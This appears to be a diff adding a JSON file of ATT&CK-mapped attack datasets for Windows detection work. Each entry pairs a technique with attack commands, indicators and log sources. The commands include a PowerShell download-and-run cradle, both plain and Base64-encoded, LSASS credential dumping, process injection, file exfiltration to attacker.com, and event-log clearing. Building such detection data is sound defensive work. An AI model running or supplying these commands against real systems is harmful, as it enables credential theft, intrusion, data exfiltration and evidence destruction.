@@ -1,0 +1,149 @@
+{
+  "datasets": [
+    {
+      "name": "T1566.001_Spearphishing_Attachment",
+      "technique": "T1566.001",
+      "tactic": "Initial Access",
+      "description": "Spearphishing attachment with malicious payload",
+      "platform": "Windows",
+      "attack_commands": [
+        "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')\""
+      ],
+      "indicators": [
+        "powershell.exe spawned from outlook.exe",
+        "Network connection to suspicious IP",
+        "Base64 encoded PowerShell command"
+      ],
+      "log_sources": ["Windows Event Log", "Sysmon", "Network Traffic"]
+    },
+    {
+      "name": "T1055_Process_Injection",
+      "technique": "T1055",
+      "tactic": "Defense Evasion",
+      "description": "Process injection into legitimate processes",
+      "platform": "Windows", 
+      "attack_commands": [
+        "$proc = Get-Process -Name 'explorer' | Select-Object -First 1",
+        "$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAllocEx), (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))",
+        "Invoke-ReflectivePEInjection -PEPath 'C:\\temp\\malware.exe' -ProcessID $proc.Id"
+      ],
+      "indicators": [
+        "Unusual memory allocation patterns",
+        "Process hollowing signatures",
+        "Suspicious thread creation"
+      ],
+      "log_sources": ["Sysmon", "Windows Event Log", "EDR"]
+    },
+    {
+      "name": "T1059.001_PowerShell_Execution", 
+      "technique": "T1059.001",
+      "tactic": "Execution",
+      "description": "PowerShell command and script execution",
+      "platform": "Windows",
+      "attack_commands": [
+        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq 'lsass.exe'} | ForEach-Object {$_.Terminate()}\"",
+        "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApAA=="
+      ],
+      "indicators": [
+        "Base64 encoded PowerShell commands",
+        "PowerShell execution with bypass flags",
+        "Suspicious WMI queries"
+      ],
+      "log_sources": ["PowerShell Logging", "Sysmon", "Windows Event Log"]
+    },
+    {
+      "name": "T1003.001_LSASS_Memory_Dump",
+      "technique": "T1003.001",
+      "tactic": "Credential Access",
+      "description": "Dumping LSASS memory for credential harvesting",
+      "platform": "Windows",
+      "attack_commands": [
+        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
+        "procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass_dump.dmp",
+        "tasklist /svc | findstr lsass.exe"
+      ],
+      "indicators": [
+        "Access to LSASS process memory",
+        "Creation of .dmp files",
+        "Unusual process access patterns"
+      ],
+      "log_sources": ["Sysmon", "Windows Event Log", "EDR"]
+    },
+    {
+      "name": "T1018_Remote_System_Discovery",
+      "technique": "T1018", 
+      "tactic": "Discovery",
+      "description": "Network and system discovery activities",
+      "platform": "Windows",
+      "attack_commands": [
+        "net view /domain",
+        "nltest /domain_trusts",
+        "arp -a",
+        "ipconfig /all",
+        "nslookup",
+        "ping -n 1 192.168.1.1-254"
+      ],
+      "indicators": [
+        "Multiple network discovery commands",
+        "Domain trust enumeration",
+        "ARP table queries"
+      ],
+      "log_sources": ["Command Line Logging", "Network Traffic", "Windows Event Log"]
+    },
+    {
+      "name": "T1021.001_RDP_Lateral_Movement",
+      "technique": "T1021.001",
+      "tactic": "Lateral Movement", 
+      "description": "Remote Desktop Protocol lateral movement",
+      "platform": "Windows",
+      "attack_commands": [
+        "mstsc /v:192.168.1.50 /u:admin /p:password123",
+        "net use \\\\192.168.1.50\\c$ /u:admin password123",
+        "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+      ],
+      "indicators": [
+        "RDP connections to multiple hosts",
+        "Registry modifications for RDP",
+        "Network shares enumeration"
+      ],
+      "log_sources": ["Windows Security Log", "Network Traffic", "RDP Logs"]
+    },
+    {
+      "name": "T1041_Exfiltration_C2",
+      "technique": "T1041",
+      "tactic": "Exfiltration",
+      "description": "Data exfiltration over command and control channel",
+      "platform": "Windows",
+      "attack_commands": [
+        "powershell.exe -Command \"Get-ChildItem C:\\Users -Recurse -Include *.txt,*.docx,*.pdf | ForEach-Object {$content = Get-Content $_.FullName; Invoke-WebRequest -Uri 'http://attacker.com/exfil' -Method POST -Body $content}\"",
+        "curl -X POST -d @C:\\temp\\sensitive_data.txt http://192.168.1.100:8080/upload"
+      ],
+      "indicators": [
+        "Large outbound data transfers",
+        "HTTP POST requests to external IPs",
+        "File enumeration activities"
+      ],
+      "log_sources": ["Network Traffic", "Proxy Logs", "File System Monitoring"]
+    },
+    {
+      "name": "T1070.004_File_Deletion",
+      "technique": "T1070.004",
+      "tactic": "Defense Evasion",
+      "description": "File and directory deletion to hide artifacts",
+      "platform": "Windows",
+      "attack_commands": [
+        "del /f /s /q C:\\temp\\*.log",
+        "sdelete -p 3 -s -z C:\\temp",
+        "wevtutil cl System",
+        "wevtutil cl Security",
+        "fsutil usn deletejournal /n c:"
+      ],
+      "indicators": [
+        "Event log clearing",
+        "Mass file deletions",
+        "USN journal deletion"
+      ],
+      "log_sources": ["Windows Event Log", "File System Monitoring", "Security Log"]
+    }
+  ]
+} 
